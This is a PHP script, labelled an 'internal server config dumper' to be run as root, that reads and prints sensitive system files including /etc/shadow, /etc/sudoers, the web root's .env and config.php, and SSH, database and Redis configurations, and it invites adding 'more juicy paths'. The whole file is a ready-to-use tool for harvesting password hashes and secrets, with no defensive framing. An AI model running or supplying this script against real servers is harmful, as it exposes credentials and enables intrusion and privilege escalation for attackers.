<?php

function print_file(string $path): void
{
    if (!file_exists($path)) {
        echo "[ ] $path → not found or inaccessible\n";
        return;
    }

    $stat = @stat($path);
    if ($stat === false) {
        echo "[ ] $path → stat failed (" . error_get_last()['message'] . ")\n";
        return;
    }

    if (is_dir($path)) {
        echo "[ ] $path → is a directory, skipping\n";
        return;
    }

    $content = @file_get_contents($path);
    if ($content === false) {
        $err = error_get_last();
        echo "[ ] $path → cannot read (" . ($err['message'] ?? 'unknown error') . ")\n";
        return;
    }

    $size   = $stat['size'];
    $uid    = $stat['uid'];
    $gid    = $stat['gid'];
    $mode   = $stat['mode'] & 07777; // just permissions
    $octal  = sprintf('%04o', $mode);

    echo "\n[+] $path (size: $size bytes, uid:$uid gid:$gid mode:0$octal)\n";
    echo "--------------------------------------------------\n";
    echo $content;
    echo "\n--------------------------------------------------\n\n";
}

echo "Internal server config dumper (run as root for best results)\n";
echo "Current uid: " . posix_geteuid() . "  euid: " . posix_getuid() . "\n";
echo "Current gid: " . posix_getegid() . "  egid: " . posix_getgid() . "\n\n";

$configs = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/group',
    '/etc/sudoers',
    '/etc/sudoers.d/README',
    '/etc/apache2/apache2.conf',
    '/etc/apache2/sites-enabled/000-default.conf',
    '/etc/nginx/nginx.conf',
    '/etc/nginx/sites-enabled/default',
    '/etc/mysql/my.cnf',
    '/etc/mysql/mariadb.conf.d/50-server.cnf',
    '/etc/postgresql/14/main/postgresql.conf',     // versioned – adjust if needed
    '/etc/postgresql/15/main/postgresql.conf',
    '/etc/ssh/sshd_config',
    '/etc/redis/redis.conf',
    '/etc/docker/daemon.json',
    '/var/www/html/config.php',
    '/var/www/html/.env',
    '/etc/hosts',
    '/proc/cpuinfo',
    '/proc/meminfo',
    // feel free to add more juicy paths here
];

foreach ($configs as $path) {
    // simple glob-like support for the postgresql wildcard case
    if (str_contains($path, '*')) {
        $files = glob($path);
        if ($files) {
            foreach ($files as $f) {
                print_file($f);
            }
        } else {
            echo "[ ] $path → no matching files found\n\n";
        }
        continue;
    }
    print_file($path);
}

echo "\nDone.\n";
